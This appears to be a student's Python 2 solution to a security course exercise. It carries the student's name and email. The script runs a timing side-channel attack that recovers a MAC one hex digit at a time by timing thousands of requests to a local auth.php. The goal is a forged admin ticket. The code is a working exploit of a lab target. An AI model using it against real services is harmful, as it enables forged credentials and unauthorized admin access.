#Vishruta Rudresh
#vrudresh@andrew.cmu.edu
# 
# My MAC: ecb884450cc2b7fde5112ad8127803a8
#
#

import httplib
import nanotime

url="127.0.0.1";
conn=httplib.HTTPConnection(url);
goldtext='{"username":"vrudresh","is_admin":"true","expired":"2015-12-31"}&mac='

def getMAC():
	mac = ""; #Holds the MAC value
	initial = "0000000000000000000000000000000";
	time_avg = 0; #calculate the median
	time=[]; #holds the time diff values for a given MAC value
	time_med = []; #holds the corresponding median values for the MAC hex values
	#avg = [0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0];
	mac_hex=['0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f'];
	for i in range(0,32,1):
		for j in range(0,16,1):
			#iterate the request and response for a given MAC value, a large number of times to receive a sample space
			for k in range(0,4000,1):
				#start clock
				start = nanotime.now();
				start_now = start.nanoseconds();
				conn=httplib.HTTPConnection(url);
				#send request 
                        	conn.request("GET","/auth.php?ticket="+goldtext+mac+str(mac_hex[j])+initial);
				#receive response
				conn.getresponse();
				stop = nanotime.now();
				#stop clock
				stop_now = stop.nanoseconds();
				#find the difference between start clock and stop clock
				diff = stop_now-start_now;
				time.append(diff);

			time.sort();
			#find the median for the sampled space
			time_avg = (time[2000]+time[2001])/2;
			#add the median value for each hex value of the MAC into the array
			time_med.append(time_avg);
			print "time median: %d" %(time_avg)	
			time = [];

		print "\n"
		#find the maximum median in the sample for a given MAC value
		max_value = max(time_med);
		#Find the hex value of the MAC
		ind = time_med.index(max_value);
		mac+=mac_hex[ind];
		loop = 32-len(mac);
		initial = "";
		if loop>0:
			for l in range(0,loop-1,1):
				initial+='0';
		print "MAC value %s" %(mac)	
		time_med = [];
	#return MAC value once completed
	return mac;

MAC_value=getMAC();
print ("\n")
print ("MAC is=%s" %(MAC_value));
